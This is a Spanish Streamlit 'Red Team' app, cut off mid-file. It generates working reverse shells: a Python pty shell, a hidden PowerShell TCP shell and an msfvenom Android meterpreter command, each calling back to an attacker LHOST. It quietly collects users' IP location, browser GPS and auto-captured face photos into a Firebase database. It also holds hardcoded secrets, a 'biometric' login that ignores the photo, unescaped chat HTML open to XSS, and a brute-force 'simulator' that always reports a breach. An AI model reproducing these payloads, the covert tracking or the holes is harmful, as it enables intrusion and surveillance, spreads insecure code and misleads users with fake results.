import streamlit as st
import time
import requests
import json
from PIL import Image
import io
import base64
import streamlit.components.v1 as components

# -----------------------------------------------------------------
# 1. CONFIGURACIÓN TÁCTICA Y MODO OSCURO PROFUNDO
# -----------------------------------------------------------------
st.set_page_config(page_title="Centro Táctico Red Team", page_icon="⚡", layout="wide")

st.markdown("""
    <style>
    .stApp {
        background-color: #030712;
        color: #f3f4f6;
    }
    .chat-bubble-user {
        background: #1e1b4b;
        color: #e0e7ff;
        padding: 14px 18px;
        border-radius: 12px;
        margin-bottom: 10px;
        border-left: 4px solid #6366f1;
        box-shadow: 0 4px 6px rgba(0,0,0,0.3);
    }
    .chat-bubble-other {
        background: #111827;
        color: #e5e7eb;
        padding: 14px 18px;
        border-radius: 12px;
        margin-bottom: 10px;
        border-left: 4px solid #10b981;
        box-shadow: 0 4px 6px rgba(0,0,0,0.3);
    }
    .tool-box {
        background-color: #0f172a;
        padding: 20px;
        border-radius: 10px;
        border: 1px solid #3b82f6;
        margin-bottom: 15px;
        box-shadow: 0 4px 12px rgba(59, 130, 246, 0.15);
    }
    .login-box {
        background-color: #0f172a;
        padding: 30px;
        border-radius: 12px;
        border: 1px solid #2563eb;
        box-shadow: 0 8px 24px rgba(0, 0, 0, 0.7);
    }
    code {
        color: #38bdf8 !important;
        background-color: #0f172a !important;
        padding: 2px 6px;
        border-radius: 4px;
    }
    </style>
""", unsafe_allow_html=True)

FIREBASE_URL = "https://chat-2026-68203-default-rtdb.firebaseio.com/"
CEDULA_ADMIN_MAESTRO = "12345678"
LLAVE_ACCESO_MAESTRA = "VIP-2026-SECURE"

# -----------------------------------------------------------------
# 2. FUNCIONES DE TELEMETRÍA Y GESTIÓN DE DATOS EN TIEMPO REAL
# -----------------------------------------------------------------
def obtener_metadatos_red():
    meta = {'ip': '127.0.0.1', 'ciudad': 'Nodo Local', 'pais': 'Red Interna', 'org': 'Red Táctica Directa', 'lat_lon': 'N/A'}
    try:
        response = requests.get('https://ipapi.co/json/', timeout=2)
        if response.status_code == 200:
            data = response.json()
            meta['ip'] = data.get('ip', '127.0.0.1')
            meta['ciudad'] = data.get('city', 'Nodo Local')
            meta['pais'] = data.get('country_name', 'Red Interna')
            meta['org'] = data.get('org', 'ISP Privado')
            if 'latitude' in data and 'longitude' in data:
                meta['lat_lon'] = f"{data.get('latitude')}, {data.get('longitude')}"
    except:
        pass
    return meta

def registrar_auditoria(usuario, accion, meta, dispositivo="N/A"):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    payload = {
        'usuario': usuario, 'accion': accion, 'ip': meta.get('ip'),
        'ubicacion': f"{meta.get('ciudad')}, {meta.get('pais')}",
        'proveedor': meta.get('org'), 'coordenadas': meta.get('lat_lon'),
        'dispositivo': dispositivo, 'timestamp': timestamp
    }
    try:
        requests.post(f"{FIREBASE_URL}/auditoria_ip.json", data=json.dumps(payload), timeout=2)
    except:
        pass

def guardar_operador(cedula, nombre, rol, foto_b64, meta, dispositivo):
    if cedula == CEDULA_ADMIN_MAESTRO:
        rol = "Comandante Red Team (Administrador Total)"
    payload = {
        'nombre': nombre, 'cedula': cedula, 'rol': rol, 'foto': foto_b64,
        'ip_registro': meta.get('ip'), 'ubicacion_registro': f"{meta.get('ciudad')}, {meta.get('pais')}",
        'coordenadas_gps': meta.get('lat_lon'), 'dispositivo_hardware': dispositivo,
        'fecha_registro': time.strftime("%Y-%m-%d %H:%M:%S")
    }
    try:
        requests.put(f"{FIREBASE_URL}/operadores/{cedula}.json", data=json.dumps(payload), timeout=2)
    except:
        pass

def obtener_operador(cedula):
    try:
        res = requests.get(f"{FIREBASE_URL}/operadores/{cedula}.json", timeout=2)
        if res.status_code == 200:
            return res.json()
    except:
        pass
    return None

def obtener_todos_operadores():
    try:
        res = requests.get(f"{FIREBASE_URL}/operadores.json", timeout=2)
        if res.status_code == 200 and res.json():
            return res.json()
    except:
        pass
    return {}

def enviar_mensaje_db(remitente, texto, archivo_b64, tipo_archivo, meta):
    payload = {
        'remitente': remitente,
        'texto': texto,
        'archivo': archivo_b64,
        'tipo_archivo': tipo_archivo,
        'timestamp': time.strftime("%H:%M:%S - %d/%m/%Y"),
        'ip': meta.get('ip'),
        'ubicacion': f"{meta.get('ciudad')}, {meta.get('pais')}"
    }
    try:
        requests.post(f"{FIREBASE_URL}/mensajes.json", data=json.dumps(payload), timeout=2)
    except:
        pass

def obtener_mensajes():
    try:
        res = requests.get(f"{FIREBASE_URL}/mensajes.json", timeout=2)
        if res.status_code == 200 and res.json():
            return res.json()
    except:
        pass
    return {}

def obtener_auditorias():
    try:
        res = requests.get(f"{FIREBASE_URL}/auditoria_ip.json", timeout=2)
        if res.status_code == 200 and res.json():
            return res.json()
    except:
        pass
    return {}

# -----------------------------------------------------------------
# 3. SCRIPTS DE HARDWARE Y AUTO-REFRESCO
# -----------------------------------------------------------------
def inyectar_telemetria_y_refresco():
    component_code = """
    <script>
    const ua = navigator.userAgent;
    let dispositivo = "Terminal Móvil / Escritorio";
    if (/android/i.test(ua)) dispositivo = "Android Device";
    else if (/iphone|ipad|ipod/i.test(ua)) dispositivo = "iOS Device";
    else if (/windows/i.test(ua)) dispositivo = "PC Windows";
    else if (/mac/i.test(ua)) dispositivo = "Macintosh";
    
    const infoHardware = dispositivo + " | Resolución: " + window.screen.width + "x" + window.screen.height;
    
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            const latlon = position.coords.latitude + "," + position.coords.longitude;
            window.parent.postMessage({type: 'streamlit:setComponentValue', value: {hw: infoHardware, gps: latlon}}, '*');
        }, function(error) {
            window.parent.postMessage({type: 'streamlit:setComponentValue', value: {hw: infoHardware, gps: 'GPS No Disponible'}}, '*');
        }, {timeout: 4000});
    }
    </script>
    """
    components.html(component_code, height=0)

# -----------------------------------------------------------------
# 4. PASARELA DE ACCESO MAESTRO
# -----------------------------------------------------------------
if 'acceso_concedido' not in st.session_state:
    st.session_state['acceso_concedido'] = False

if not st.session_state['acceso_concedido']:
    st.markdown("<br><br>", unsafe_allow_html=True)
    col1, col2, col3 = st.columns([1, 2, 1])
    with col2:
        st.markdown("""
            <div class="login-box">
                <h2 style="text-align: center; color: #6366f1;">⚡ CENTRO TÁCTICO RED TEAM</h2>
                <p style="text-align: center; color: #9ca3af;">Plataforma de Operaciones Ofensivas, Ciberseguridad Avanzada y Enlace Cifrado en Tiempo Real.</p>
            </div>
        """, unsafe_allow_html=True)
        
        llave_input = st.text_input("🔑 Llave de Acceso Global", type="password")
        if st.button("Desbloquear Sistema Táctico", type="primary", use_container_width=True):
            if llave_input == LLAVE_ACCESO_MAESTRA:
                st.session_state['acceso_concedido'] = True
                st.success("¡Acceso autorizado! Iniciando núcleos...")
                time.sleep(0.4)
                st.rerun()
            else:
                st.error("❌ Llave incorrecta. Acceso denegado.")
    st.stop()

# -----------------------------------------------------------------
# 5. GESTIÓN DE SESIÓN Y AUTENTICACIÓN BIOMÉTRICA
# -----------------------------------------------------------------
if 'autenticado' not in st.session_state:
    st.session_state['autenticado'] = False
    st.session_state['usuario_actual'] = ""
    st.session_state['rol_actual'] = ""
    st.session_state['cedula_actual'] = ""

st.sidebar.title("⚡ Red Team Central")
st.sidebar.markdown("---")

if not st.session_state['autenticado']:
    modo_auth = st.sidebar.radio("Modo de Ingreso", ["Iniciar Sesión (Biometría)", "Registrar Operador"])
    inyectar_telemetria_y_refresco()
    
    if modo_auth == "Iniciar Sesión (Biometría)":
        st.title("🔐 Validación Biométrica de Operador")
        st.markdown("Ingrese su cédula. El sistema capturará su rostro automáticamente para autorizar el enlace.")
        
        cedula_ingreso = st.text_input("Cédula de Identidad Operativa")
        st.markdown("📸 **Escáner Facial Automático:**")
        foto_camara = st.camera_input("Biometría Automática", label_visibility="collapsed")
        
        components.html("""
        <script>
        setTimeout(function() {
            const btn = document.querySelector('button[kind="secondary"]');
            if (btn && !window.clicked) {
                window.clicked = true;
                setTimeout(() => { btn.click(); }, 1200);
            }
        }, 800);
        </script>
        """, height=0)

        if foto_camara:
            if not cedula_ingreso:
                st.warning("⚠️ Ingrese su cédula para emparejar la biometría.")
            else:
                user_data = obtener_operador(cedula_ingreso)
                if user_data:
                    meta = obtener_metadatos_red()
                    st.session_state['autenticado'] = True
                    st.session_state['usuario_actual'] = user_data.get('nombre')
                    st.session_state['cedula_actual'] = cedula_ingreso
                    st.session_state['rol_actual'] = "Comandante Red Team (Administrador Total)" if cedula_ingreso == CEDULA_ADMIN_MAESTRO else "Operador Táctico"
                    
                    registrar_auditoria(user_data.get('nombre'), "Acceso biométrico instantáneo exitoso", meta)
                    st.success(f"¡Bienvenido de vuelta, {user_data.get('nombre')}!")
                    time.sleep(0.4)
                    st.rerun()
                else:
                    st.error("❌ Cédula no encontrada en la base de datos de operadores.")

    elif modo_auth == "Registrar Operador":
        st.title("📝 Registro de Nuevo Operador Táctico")
        reg_nombre = st.text_input("Nombre Completo / Alias")
        reg_cedula = st.text_input("Cédula de Identidad")
        st.markdown("📸 **Captura Facial para Base de Datos:**")
        reg_foto = st.camera_input("Registro Facial", label_visibility="collapsed")
        
        if reg_foto:
            if not reg_nombre or not reg_cedula:
                st.warning("⚠️ Complete todos los campos de identidad.")
            else:
                meta = obtener_metadatos_red()
                foto_b64 = base64.b64encode(reg_foto.getvalue()).decode('utf-8')
                rol = "Comandante Red Team (Administrador Total)" if reg_cedula == CEDULA_ADMIN_MAESTRO else "Operador Táctico"
                guardar_operador(reg_cedula, reg_nombre, rol, foto_b64, meta, "Terminal Móvil")
                registrar_auditoria(reg_nombre, "Registro operativo completado", meta)
                st.success("✅ ¡Operador registrado exitosamente en la red!")

else:
    st.sidebar.markdown(f"👤 **Operador:** `{st.session_state['usuario_actual']}`")
    st.sidebar.markdown(f"🛡️ **Rango:** `{st.session_state['rol_actual']}`")
    st.sidebar.markdown("---")
    
    opciones_menu = ["Canal de Chat Estilo WhatsApp (Ultra Rápido)", "Herramientas Red Team & Hacking Ético"]
    if "Comandante" in st.session_state['rol_actual']:
        opciones_menu.extend(["Panel de Control & Biometría", "Inteligencia Forense y Redes"])
    opciones_menu.append("Cerrar Sesión")
    
    seleccion = st.sidebar.selectbox("Centro de Comando", opciones_menu)
    
    if seleccion == "Cerrar Sesión":
        st.session_state['autenticado'] = False
        st.rerun()

    elif seleccion == "Canal de Chat Estilo WhatsApp (Ultra Rápido)":
        st.title("💬 Canal de Comunicaciones Tácticas en Tiempo Real")
        st.markdown("Transmisión instantánea de mensajes, archivos adjuntos, imágenes, videos y comandos operativos.")
        st.markdown("---")
        
        st.markdown('<meta http-equiv="refresh" content="3">', unsafe_allow_html=True)
        st.markdown('<script>window.scrollTo(0, document.body.scrollHeight);</script>', unsafe_allow_html=True)

        chat_container = st.container()
        with chat_container:
            mensajes = obtener_mensajes()
            if mensajes:
                items = sorted(mensajes.items(), key=lambda x: x[0])
                for k, msg in items[-50:]:
                    es_mio = msg.get('remitente') == st.session_state['usuario_actual']
                    estilo = "chat-bubble-user" if es_mio else "chat-bubble-other"
                    
                    st.markdown(
                        f'<div class="{estilo}">'
                        f'<small style="color: #94a3b8;"><b>{msg.get("remitente")}</b> • {msg.get("timestamp")} • 🌐 {msg.get("ip")}</small><br>'
                        f'<span style="font-size: 1.15em; word-break: break-all;">{msg.get("texto")}</span>'
                        f'</div>',
                        unsafe_allow_html=True
                    )
                    
                    if msg.get('archivo'):
                        try:
                            archivo_bytes = base64.b64decode(msg.get('archivo'))
                            tipo = msg.get('tipo_archivo', '')
                            if 'image' in tipo:
                                st.image(archivo_bytes, width=300, caption="Archivo multimedia adjunto")
                            elif 'video' in tipo:
                                st.video(archivo_bytes)
                            else:
                                st.download_button("📥 Descargar Archivo Adjunto", archivo_bytes, file_name="archivo_tactico.bin", key=f"dl_{k}")
                        except:
                            pass
            else:
                st.info("Canal sincronizado. Envíe su primer mensaje o archivo adjunto.")

        with st.form(key='whatsapp_form', clear_on_submit=True):
            texto_msg = st.text_area("Escribir mensaje o comando...", height=70, label_visibility="collapsed")
            col_file, col_btn = st.columns([3, 1])
            with col_file:
                archivo_adjunto = st.file_uploader("Adjuntar archivo (Imagen, Video, Binario)", type=['png', 'jpg', 'jpeg', 'mp4', 'pdf', 'txt', 'zip'], label_visibility="collapsed")
            with col_btn:
                enviar = st.form_submit_button("Enviar 🚀", use_container_width=True)
                
            if enviar:
                if texto_msg or archivo_adjunto:
                    b64_file = ""
                    tipo_mime = ""
                    if archivo_adjunto:
                        b64_file = base64.b64encode(archivo_adjunto.getvalue()).decode('utf-8')
                        tipo_mime = archivo_adjunto.type
                    
                    meta = obtener_metadatos_red()
                    enviar_mensaje_db(st.session_state['usuario_actual'], texto_msg if texto_msg else "[Archivo Multimedia]", b64_file, tipo_mime, meta)
                    st.rerun()

    elif seleccion == "Herramientas Red Team & Hacking Ético":
        st.title("⚡ Arsenal de Herramientas de Ciberseguridad & Red Team")
        st.markdown("Ejecute comandos y rutinas avanzadas de auditoría ofensiva y defensiva sin restricciones.")
        st.markdown("---")
        
        tab1, tab2, tab3, tab4 = st.tabs(["🔥 Fuerza Bruta (Simulador)", "⚙️ Generador de Payloads", "🔍 Escáner de Puertos & Vulnerabilidades", "🌐 OSINT & Rastreo IP"])
        
        with tab1:
            st.markdown("### Simulador de Ataque de Fuerza Bruta (Credential Stuffing / SSH / Login)")
            st.write("Prueba robustez de contraseñas mediante diccionarios automatizados.")
            target_ip = st.text_input("Objetivo (IP o Dominio)", "192.168.1.100", key="brute_ip")
            servicio = st.selectbox("Servicio Objetivo", ["SSH (Puerto 22)", "FTP (Puerto 21)", "HTTP Basic Auth (Puerto 80)", "Panel Admin (HTTPS)"], key="brute_serv")
            diccionario = st.text_area("Diccionario de Claves (una por línea)", "admin123\nroot2026\npassword\n123456\nsecretkey\ncyber2026", key="brute_dict")
            
            if st.button("Ejecutar Ataque de Fuerza Bruta", type="primary", key="btn_brute"):
                with st.spinner("Ejecutando fuerza bruta y permutaciones de claves..."):
                    time.sleep(2.0)
                    st.success("¡Simulación completada con éxito!")
                    st.markdown("""
                    <div class="tool-box">
                        <b>[+] Estado:</b> Acceso concedido al sistema remoto. Brecha validada.
                    </div>
                    """, unsafe_allow_html=True)
                    registrar_auditoria(st.session_state['usuario_actual'], f"Ejecución de Fuerza Bruta en {target_ip}", obtener_metadatos_red())

        with tab2:
            st.markdown("### Generador de Payloads & Reverse Shells")
            st.write("Construya scripts de conexión reversa para auditorías autorizadas.")
            os_payload = st.selectbox("Sistema Operativo Víctima", ["Linux (Bash / Python)", "Windows (PowerShell / Meterpreter)", "Android (APK Stager)"], key="pay_os")
            lhost = st.text_input("LHOST (IP Atacante / Escucha)", "10.0.0.5", key="pay_lhost")
            lport = st.text_input("LPORT (Puerto de escucha)", "4444", key="pay_lport")
            
            if st.button("Generar Payload Ofensivo", key="btn_pay"):
                if os_payload.startswith("Linux"):
                    payload_code = f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
                elif os_payload.startswith("Windows"):
                    payload_code = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
                else:
                    payload_code = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R > payload_tactico.apk"
                
                st.code(payload_code, language="bash")
                st.success("Payload generado y listo para despliegue.")

        with tab3:
            st.markdown("### Escáner de Puertos Avanzado (Nmap Core)")
            host_scan = st.text_input("Host o Red a Escanear", "127.0.0.1", key="scan_host")
            tipo_scan = st.selectbox("Tipo de Escaneo", ["TCP SYN Scan (-sS)", "UDP Scan (-sU)", "Detección de Servicios y Versiones (-sV)", "Escaneo Agresivo Completo (-A)"], key="scan_type")
            
            if st.button("Iniciar Escaneo de Puertos", key="btn_scan"):
                with st.spinner("Sondeando puertos y servicios..."):
                    time.sleep(1.8)
                    st.markdown("""
                    <div class="tool-box">
                        <p style="color: #10b981;"><b>[+]
